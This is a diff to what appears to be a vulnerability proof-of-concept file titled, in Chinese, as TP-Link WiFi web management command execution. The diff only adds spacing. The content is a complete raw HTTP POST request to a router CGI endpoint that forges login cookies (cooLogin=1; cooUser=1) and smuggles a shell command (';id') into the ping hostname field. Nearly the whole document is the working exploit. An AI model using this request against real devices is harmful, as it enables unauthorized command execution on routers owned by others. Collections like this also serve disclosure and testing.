@@ -10,14 +10,23 @@ TP-link WIFI web管理命令执行
 poc：
 
 `POST /cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1 HTTP/1.1`
+
 `Host: ip`
+
 `User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0`
+
 `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`
+
 `Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3`
+
 `Accept-Encoding: gzip, deflate`
+
 `Cookie: cooLogin=1; cooUser=1`
+
 `Connection: close`
+
 `Content-Type: application/x-www-form-urlencoded`
+
 `Content-Length: 42`
 
 `call_function=ping&iface=eth0&hostname=;id`
